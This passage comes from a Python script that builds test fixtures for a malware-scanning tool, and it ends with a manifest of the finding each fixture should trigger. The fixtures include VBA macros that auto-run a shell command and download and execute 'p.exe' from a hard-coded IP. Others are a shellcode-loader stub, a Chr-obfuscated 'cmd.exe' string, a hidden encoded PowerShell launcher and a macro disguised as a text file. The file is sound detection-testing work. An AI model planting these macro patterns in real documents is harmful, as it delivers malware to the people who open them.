    '    Set ws = ActiveWorkbook.Sheets(1)\n'
    '    ws.Range("A1").Value = "Quarterly Report"\n'
    'End Sub\n')

write_text(os.path.join(VBA_DIR, 'autoexec.bas'),
    'Attribute VB_Name = "Startup"\n'
    'Option Explicit\n'
    '\n'
    'Sub Auto_Open()\n'
    '    Dim sh As Object\n'
    '    Set sh = CreateObject("WScript.Shell")\n'
    '    sh.Run "cmd.exe /c whoami", 0, False\n'
    'End Sub\n')

write_text(os.path.join(VBA_DIR, 'downloader.bas'),
    'Attribute VB_Name = "Fetch"\n'
    'Option Explicit\n'
    '\n'
    'Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" _\n'
    '    Alias "URLDownloadToFileA" (ByVal p As Long, ByVal sURL As String, _\n'
    '    ByVal sFile As String, ByVal d As Long, ByVal cb As Long) As Long\n'
    '\n'
    'Sub GetPayload()\n'
    '    Dim sh As Object\n'
    '    URLDownloadToFile 0, "http://198.51.100.7/p.exe", "C:\\Users\\Public\\p.exe", 0, 0\n'
    '    Set sh = CreateObject("WScript.Shell")\n'
    '    sh.Run "C:\\Users\\Public\\p.exe", 0, False\n'
    'End Sub\n')

write_text(os.path.join(VBA_DIR, 'shellcode.bas'),
    'Attribute VB_Name = "Loader"\n'
    'Option Explicit\n'
    '\n'
    'Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, _\n'
    '    ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr\n'
    'Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" (ByVal dest As LongPtr, _\n'
    '    ByRef src As Any, ByVal length As Long)\n'
    '\n'
    'Sub Load()\n'
    '    Dim addr As LongPtr\n'
    '    addr = VirtualAlloc(0, 4096, &H3000, &H40)\n'
    'End Sub\n')

write_text(os.path.join(VBA_DIR, 'obfuscated.cls'),
    'VERSION 1.0 CLASS\n'
    'Attribute VB_Name = "Decoder"\n'
    'Option Explicit\n'
    '\n'
    'Public Function Build() As String\n'
    '    Build = Chr(99) & Chr(109) & Chr(100) & Chr(46) & Chr(101) & Chr(120) & Chr(101)\n'
    '    Build = StrReverse(Build)\n'
    'End Function\n')

write_text(os.path.join(VBA_DIR, 'launcher.vbs'),
    'Set sh = CreateObject("WScript.Shell")\n'
    'sh.Run "powershell -nop -w hidden -enc SQBFAFgA", 0, False\n')

write_text(os.path.join(VBA_DIR, 'encoded.vbe'),
    '#@~^ZQAAAA==encoded-by-script-encoder-placeholder\n')

# VBA source hiding under an innocent extension — the classifier must detect it
# by content and the disguise rule must fire (MTS-DISGUISE-002).
write_text(os.path.join(DISGUISED_DIR, 'macro.txt'),
    'Attribute VB_Name = "Hidden"\n'
    'Option Explicit\n'
    '\n'
    'Sub Document_Open()\n'
    '    Dim sh As Object\n'
    '    Set sh = CreateObject("WScript.Shell")\n'
    '    sh.Run "cmd.exe /c whoami", 0, False\n'
    'End Sub\n')

# ─────────────────────────────────────────────────────────────────────────────
# Manifest
# ─────────────────────────────────────────────────────────────────────────────
manifest = {
    "schemaVersion": "0.1.0",
    "fixtures": {
        "python/clean_pkg-1.0-py3-none-any.whl":            {"expectCves": False, "expectSbom": False},
        "python/vulnerable_deps_pkg-1.0-py3-none-any.whl":  {"expectCves": True,  "expectSbom": True},
        "python/corrupt_pkg-1.0-py3-none-any.whl":          {"expectExtractFailure": True},
        "python/traversal_pkg-1.0-py3-none-any.whl":        {"expectFinding": "MTS-EXTRACT-TRAVERSAL"},
        "native/native_clean_pkg-1.0-py3-none-any.whl":     {"expectBinaryFindings": False},
        "native/suspicious_imports_pkg-1.0-py3-none-any.whl": {"expectFinding": "BINARY-SUSPICIOUS-IMPORT"},
        "native/network_native_pkg-1.0-py3-none-any.whl":   {"expectFinding": "BINARY-NETWORK-IMPORT"},
        "native/fake_native_pkg-1.0-py3-none-any.whl":      {"expectFinding": "BINARY-INVALID-FORMAT"},
        "pysource/clean.py":   {"expectBandit": False, "expectSecrets": False},
        "pysource/risky.py":   {"expectBandit": True},
        "pysource/secrets.py": {"expectSecrets": True},
        "notebook/nb_clean.ipynb":     {"expectNotebookFinding": False},
        "notebook/nb_eval.ipynb":      {"expectBanditViaProjection": True},
        "notebook/nb_outputs.ipynb":   {"expectFinding": "NOTEBOOK-SAVED-OUTPUT"},
        "notebook/nb_malformed.ipynb": {"expectFinding": "NOTEBOOK-MALFORMED"},
        "disguised/readme.txt":  {"expectFinding": "MTS-DISGUISE-002", "detectedType": "powershell"},
        "disguised/output.log":  {"expectFinding": "MTS-DISGUISE-002", "detectedType": "shell"},
        "disguised/data.dat":    {"expectFinding": "MTS-DISGUISE-002", "detectedType": "python"},
        "disguised/notes2.txt":  {"expectFinding": "MTS-DISGUISE-002", "detectedType": "batch"},
        "disguised/memo.txt":    {"expectNoDisguise": True},
        "pdf/pdf_clean.pdf":      {"expectActiveContent": False},
        "pdf/pdf_js.pdf":         {"expectFinding": "PDF-JAVASCRIPT"},
        "pdf/pdf_launch.pdf":     {"expectFinding": "PDF-LAUNCH"},
        "pdf/pdf_embedded.pdf":   {"expectFinding": "PDF-EMBEDDED-FILE"},
        "pdf/pdf_encrypted.pdf":  {"expectFinding": "PDF-ENCRYPTED"},
        "pdf/pdf_obfuscated.pdf": {"expectFinding": "PDF-JAVASCRIPT"},
        "pdf/pdf_fake.pdf":       {"expectFinding": "PDF-INVALID-FORMAT"},
        "office/office_clean.docx":    {"expectMacroFindings": False},
        "office/office_macro.docm":    {"expectFinding": "OFFICE-VBA-PRESENT"},
        "office/office_dde.docx":      {"expectFinding": "OFFICE-DDE"},
        "office/office_template.docx": {"expectFinding": "OFFICE-REMOTE-TEMPLATE"},
        "shell/clean.sh":       {"expectRiskyCode": False},
        "shell/remote_exec.sh": {"expectFinding": "SHELL-REMOTE-EXEC"},
        "shell/b64_exec.sh":    {"expectFinding": "SHELL-B64-EXEC"},
        "shell/eval_expand.sh": {"expectFinding": "SHELL-EVAL"},
        "shell/chmod777.sh":    {"expectFinding": "SHELL-CHMOD-777"},
        "shell/hardcoded_ip.sh":{"expectFinding": "SHELL-HARDCODED-IP"},
        "shell/sc_bugs.sh":     {"expectShellCheckFindings": True},
        "powershell/clean.ps1":      {"expectRiskyCode": False},
        "powershell/downloader.ps1": {"expectFinding": "PS-IEX"},
        "powershell/encoded.ps1":    {"expectFinding": "PS-ENCODED-COMMAND"},
        "powershell/amsi.ps1":       {"expectFinding": "PS-AMSI-TAMPER"},
        "powershell/defender.ps1":   {"expectFinding": "PS-DEFENDER-TAMPER"},
        "npm/clean/package.json":      {"expectLifecycle": False},
        "npm/malicious/package.json":  {"expectFinding": "NPM-LIFECYCLE-SCRIPT"},
        "npm/js/evil.js":              {"expectFinding": "NPM-JS-CHILD-PROCESS"},
        "npm/js/clean.js":             {"expectRiskyCode": False},
        "npm/tarball/evil_pkg-1.0.0.tgz": {"expectFinding": "NPM-LIFECYCLE-SCRIPT"},
        "npm/locked/package-lock.json":{"expectOsvOnline": True},
        "python_requirements/clean/requirements.txt":      {"expectOsvOnline": False},
        "python_requirements/unpinned/requirements.txt":   {"expectFinding": "OSV-PYPI-UNPINNED"},
        "python_requirements/hash_pinned/requirements.txt":{"expectOsvOnline": False},
        "python_requirements/vulnerable/requirements.txt": {"expectOsvOnline": True},
        "nuget/clean/Contoso.Fixture.Clean.1.0.0.nupkg":    {"expectOsvOnline": False},
        "nuget/vulnerable/Newtonsoft.Json.12.0.1.nupkg":    {"expectOsvOnline": True},
        "nuget/collide/a/Same.1.0.0.nupkg":                 {"expectOsvOnline": False},
        "nuget/collide/b/Same.1.0.0.nupkg":                 {"expectFinding": "OSV-NUGET-NO-NUSPEC"},
        "nuget/ambiguous/Confused.1.0.0.nupkg":              {"expectFinding": "OSV-NUGET-AMBIGUOUS-NUSPEC"},
        "nuget/nested_decoy/Spoofed.1.0.0.nupkg":            {"expectOsvOnline": True},
        "nuget/multi_metadata/MultiMeta.1.0.0.nupkg":        {"expectFinding": "OSV-NUGET-AMBIGUOUS-NUSPEC"},
        "nuget/duplicate_id/DupeId.1.0.0.nupkg":             {"expectFinding": "OSV-NUGET-AMBIGUOUS-NUSPEC"},
        "nuget/missing_version/NoVersion.1.0.0.nupkg":       {"expectFinding": "OSV-NUGET-AMBIGUOUS-NUSPEC"},
        "model/safe.pkl":          {"expectDeserialization": False},
        "model/malicious.pkl":     {"expectFinding": "PICKLE-REDUCE"},
        "model/model.safetensors": {"expectFinding": "MODEL-SAFE-FORMAT"},
        "model/model.pt":          {"expectFinding": "PICKLE-REDUCE"},
        "vba/clean.bas":        {"expectRiskyCode": False},
        "vba/autoexec.bas":     {"expectFinding": "VBA-AUTOEXEC-PAYLOAD"},
        "vba/downloader.bas":   {"expectFinding": "VBA-DOWNLOAD-EXEC"},
        "vba/shellcode.bas":    {"expectFinding": "VBA-SHELLCODE-API"},
        "vba/obfuscated.cls":   {"expectFinding": "VBA-OBFUSCATION-CHR"},
        "vba/launcher.vbs":     {"expectFinding": "VBA-POWERSHELL-ENC"},
        "vba/encoded.vbe":      {"expectFinding": "VBA-ENCODED-SOURCE"},
        "disguised/macro.txt":  {"expectFinding": "MTS-DISGUISE-002", "detectedType": "vba"},
        "archive/clean.zip":     {"expectHazard": False},
        "archive/bomb.zip":      {"expectFinding": "MTS-EXTRACT-BOMB", "blocked": True},
        "archive/symlink.zip":   {"expectFinding": "MTS-EXTRACT-SYMLINK"},
        "archive/nested.zip":    {"expectFinding": "MTS-EXTRACT-NESTED"},
        "archive/traversal.zip": {"expectFinding": "MTS-EXTRACT-TRAVERSAL", "blocked": True},
        "archive_member/disguised_and_scripts.zip": {"expectFinding": "MTS-DISGUISE-002"},
        "archive_member/js_no_pkg.zip":              {"expectFinding": "NPM-JS-CHILD-PROCESS"},
        "archive_member/two_level_nested.zip":       {"expectFinding": "SHELL-B64-EXEC"},
        "archive_member/nested_bomb.zip":             {"expectFinding": "MTS-EXTRACT-BOMB"},
        "archive_member/no_dupes.zip":                {"expectFinding": "NPM-LIFECYCLE-SCRIPT"},
        "archive_member/shell_only.zip":              {"expectHazard": False},
        "archive_member/nested_wheel.zip":            {"expectHazard": False},
        "archive_member/malicious_bin.zip":           {"expectFinding": "PICKLE-REDUCE"},
        "archive_member/multi_member.tgz":            {"expectHazard": False},
    }
}
with open(os.path.join(CORPUS_DIR, 'manifest.json'), 'w') as f:
    json.dump(manifest, f, indent=2)
print(f"  wrote {os.path.join(CORPUS_DIR, 'manifest.json')}")
print('Done.')
